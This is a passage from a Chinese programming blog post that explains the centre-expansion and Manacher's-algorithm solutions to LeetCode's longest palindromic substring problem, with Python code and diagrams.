<h5 id="解法4：扩展中心"><a href="#解法4：扩展中心" class="headerlink" title="解法4：扩展中心"></a>解法4：扩展中心</h5><p>我们在解法3中提到，假设一个子串$P(i,j)$为回文串，如果<code>s[i-1] == s[j+1]</code>，那$P(i-1,j+1)$也是回文串，因此我们可以在已是回文串的子串的基础上进行中心扩展，那最初的中心怎么找呢？我们可以发现，最初的子串只有长度为1和长度为2两种情况，而长度为1的子串共有<code>len(s)</code>种，长度为2的子串共有<code>len(s)-1</code>种，因此我们应该循环<code>2*len(s)-1</code>次，在循环中判断此时中心是单个字符还是两个字符，之后进行中心扩展。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-comment">#时间复杂度O(n^2) 空间复杂度O(1)</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">longestPalindrome</span><span class="hljs-params">(self, s)</span>:</span></span><br><span class="line">        max_len = <span class="hljs-number">0</span></span><br><span class="line">        max_str = <span class="hljs-string">''</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>*len(s) - <span class="hljs-number">1</span>):</span><br><span class="line">            <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:</span><br><span class="line">                start = (i<span class="hljs-number">-1</span>) // <span class="hljs-number">2</span></span><br><span class="line">                end = start + <span class="hljs-number">1</span></span><br><span class="line">                <span class="hljs-keyword">if</span>(s[start] == s[end]):</span><br><span class="line">                    <span class="hljs-keyword">while</span> start &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> end &lt; len(s)<span class="hljs-number">-1</span> <span class="hljs-keyword">and</span> s[start<span class="hljs-number">-1</span>] == s[end+<span class="hljs-number">1</span>]:</span><br><span class="line">                        start -= <span class="hljs-number">1</span></span><br><span class="line">                        end += <span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                start = end = i // <span class="hljs-number">2</span></span><br><span class="line">                <span class="hljs-keyword">while</span> start &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> end &lt; len(s)<span class="hljs-number">-1</span> <span class="hljs-keyword">and</span> s[start<span class="hljs-number">-1</span>] == s[end+<span class="hljs-number">1</span>]:</span><br><span class="line">                    start -= <span class="hljs-number">1</span></span><br><span class="line">                    end +=<span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">if</span> (end-start+<span class="hljs-number">1</span>) &gt; max_len <span class="hljs-keyword">and</span> s[start]==s[end]:</span><br><span class="line">                max_len = end-start+<span class="hljs-number">1</span></span><br><span class="line">                max_str = s[start:end+<span class="hljs-number">1</span>] </span><br><span class="line">        <span class="hljs-keyword">return</span> max_str</span><br></pre></td></tr></table></figure></p>
<h5 id="解法5：Manacher’s-Algorithm-马拉车算法"><a href="#解法5：Manacher’s-Algorithm-马拉车算法" class="headerlink" title="解法5：Manacher’s Algorithm 马拉车算法"></a>解法5：Manacher’s Algorithm 马拉车算法</h5><pre><code>解法5 转自 LeetCode 用户 windliang 的题解。</code></pre><p>马拉车算法<strong>Manacher‘s Algorithm</strong>是用来查找一个字符串的最长回文子串的线性方法，由一个叫 Manacher 的人在 1975 年发明的，这个方法的最大贡献是在于将时间复杂度提升到了线性。</p>
<h6 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h6><p>首先我们解决下奇数和偶数的问题，在每个字符间插入”#”，并且为了使得扩展的过程中，到边界后自动结束，在两端分别插入”^”和 “$”，两个不可能在字符串中出现的字符，这样中心扩展的时候，判断两端字符是否相等的时候，如果到了边界就一定会不相等，从而出了循环。经过处理，字符串的长度永远都是奇数了。<br><img src="/2019/11/16/leetcode-day3/2.jpg" alt="2.jpg"></p>
<p>我们用一个数组P保存从中心扩展的最大个数，而它刚好也是去掉”#”的<strong>原字符串的总长度</strong>。例如下图中下标是6的地方，可以看到<code>P[6]</code>等于5，所以它是从左边扩展5个字符，相应的右边也是扩展5个字符，也就是<code>#c#b#c#b#c#</code>。而去掉#恢复到原来的字符串，变成<code>cbcbc</code>，它的长度刚好也就是5。<br><img src="/2019/11/16/leetcode-day3/3.png" alt="3.jpg"></p>
<h6 id="求原字符串下标"><a href="#求原字符串下标" class="headerlink" title="求原字符串下标"></a>求原字符串下标</h6><p>用P的下标减去<code>P[i]</code>，再模2，就是原字符串的开头字符下标了。<br>例如我们找到<code>P[i]</code>的最大值为5，也就是回文串的最大长度是5，对应的下标是6，所以原字符串的开头下标是<code>(6 - 5)/ 2 = 0</code>。所以我们只需要返回原字符串的<code>s[0:5]</code>就可以了。</p>
<h6 id="求每个P-i"><a href="#求每个P-i" class="headerlink" title="求每个P[i]"></a>求每个<code>P[i]</code></h6><pre><code>接下来是算法的关键了，它充分了利用了回文串的对称性。</code></pre><p>我们用<code>C</code>表示回文串的中心，用<code>R</code>表示回文串的右边半径。所以<code>R = C + P[i]</code>。<code>C</code>和<code>R</code>所对应的回文串是当前循环中<code>R</code>最靠右的回文串。</p>
<p><img src="/2019/11/16/leetcode-day3/4.png" alt="4.jpg"><br>我们考虑求<code>P[i]</code>的时候，用<code>i_mirror</code>表示当前需要求的第<code>i</code>个字符关于<code>C</code>对应的下标。<br>现在要求<code>P[i]</code>，如果是用中心扩展法，那就向两边扩展比对就行了。但是我们其实可以利用回文串<code>C</code>的对称性。<code>i</code>关于<code>C</code>的对称点是<code>i_mirror</code>，<code>P[i_mirror] = 3</code>，所以<code>P[i]</code> 也等于3。<br>但是有三种情况将会造成直接赋值为<code>P[i_mirror]</code>是不正确的，下边一一讨论。<br><strong>1. 超出了<code>R</code></strong><br><img src="/2019/11/16/leetcode-day3/5.png" alt="5.jpg"><br>当我们要求<code>P[i]</code>的时候，<code>P[mirror] = 7</code>，而此时<code>P[i]</code>并不等于7，为什么呢，因为我们从<code>i</code>开始往后数7个，等于22，已经超过了最右的<code>R</code>，此时不能利用对称性了，但我们一定可以扩展到<code>R</code>的，所以<code>P[i]</code>至少等于<code>R - i = 20 - 15 = 5</code>，会不会更大呢，我们只需要比较<code>T[R+1]</code>和<code>T[R+1]关于 i 的对称点</code>就行了，就像中心扩展法一样一个个扩展。<br><strong>2. <code>P[i_mirror]</code>遇到了原字符串的左边界</strong><br><img src="/2019/11/16/leetcode-day3/6.png" alt="6.jpg"><br>此时<code>P[i_mirror] = 1</code>，但是<code>P[i]</code>赋值成1是不正确的，出现这种情况的原因是<code>P[i_mirror]</code>在扩展的时候首先是<code>&#39;#&#39; == &#39;#&#39;</code>，之后遇到了 <code>&#39;^&#39;</code> 和另一个字符比较，也就是到了边界，才终止循环的。而<code>P[i]</code>并没有遇到边界，所以我们可以继续通过中心扩展法一步一步向两边扩展就行了。<br><strong>2. <code>i == R</code></strong><br>此时我们先把<code>P[i]</code>赋值为0，然后通过中心扩展法一步一步扩展就行了。</p>
<h6 id="考虑C和R的更新"><a href="#考虑C和R的更新" class="headerlink" title="考虑C和R的更新"></a>考虑<code>C</code>和<code>R</code>的更新</h6><p>就这样一步一步的求出每个<code>P[i]</code>，当求出的<code>P[i]</code>的右边界大于当前的<code>R</code>时，我们就需要更新<code>C</code>和<code>R</code>为当前的回文串了。因为我们必须保证<code>i</code>在<code>R</code>里面，所以一旦有更右边的<code>R</code>就要更新<code>R</code>。<br><img src="/2019/11/16/leetcode-day3/7.jpg" alt="7.jpg"><br>此时的<code>P[i]</code>求出来将会是3，<code>P[i]</code>对应的右边界将是<code>10 + 3 = 13</code>，所以大于当前的<code>R</code>，我们需要把<code>C</code>更新成<code>i</code>的值，也就是10，<code>R</code>更新成13。继续下边的循环。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-comment">#字符串预处理</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">preprocess</span><span class="hljs-params">(self, s)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">if</span> len(s) == <span class="hljs-number">0</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-string">'$'</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            ret = <span class="hljs-string">'^'</span></span><br><span class="line">            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(s)):</span><br><span class="line">                ret += <span class="hljs-string">'#'</span>+s[i]</span><br><span class="line">            <span class="hljs-keyword">return</span> ret + <span class="hljs-string">'#$'</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">longestPalindrome</span><span class="hljs-params">(self, s)</span>:</span></span><br><span class="line">        <span class="hljs-comment">#预处理</span></span><br><span class="line">        t = self.preprocess(s)</span><br><span class="line">        P, C, R = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(t))], <span class="hljs-number">0</span>, <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,len(t)<span class="hljs-number">-1</span>):</span><br><span class="line">            i_mirror = <span class="hljs-number">2</span>*C-i</span><br><span class="line">            <span class="hljs-keyword">if</span>(R&gt;i): <span class="hljs-comment">#保证i在R内</span></span><br><span class="line">                P[i] = min(R-i, P[i_mirror])</span><br><span class="line">            <span class="hljs-keyword">else</span>: <span class="hljs-comment">#i&lt;=R的时候</span></span><br><span class="line">                P[i] = <span class="hljs-number">0</span></span><br><span class="line">            <span class="hljs-comment">#上面说的三种情况</span></span><br><span class="line">            <span class="hljs-comment">#因为其余情况下P[i]已确定，因此不会进入循环</span></span><br><span class="line">            <span class="hljs-keyword">while</span> t[i+<span class="hljs-number">1</span>+P[i]] == t[i<span class="hljs-number">-1</span>-P[i]]:</span><br><span class="line">                P[i]+=<span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-comment">#更新C和R</span></span><br><span class="line">            <span class="hljs-keyword">if</span> i + P[i] &gt; R:</span><br><span class="line">                C = i</span><br><span class="line">                R = i + P[i]</span><br><span class="line">        len_max = <span class="hljs-number">0</span></span><br><span class="line">        centerIndex = <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, len(t)<span class="hljs-number">-1</span>):</span><br><span class="line">            <span class="hljs-keyword">if</span> P[i] &gt; len_max:</span><br><span class="line">                len_max = P[i]</span><br><span class="line">                centerIndex = i</span><br><span class="line">        <span class="hljs-comment">#根据公式计算start</span></span><br><span class="line">        start = (centerIndex - len_max)/<span class="hljs-number">2</span></span><br><span class="line">        <span class="hljs-keyword">return</span> s[start:start+len_max]</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>LeetCode系列</category>
      </categories>
  </entry>
</search>
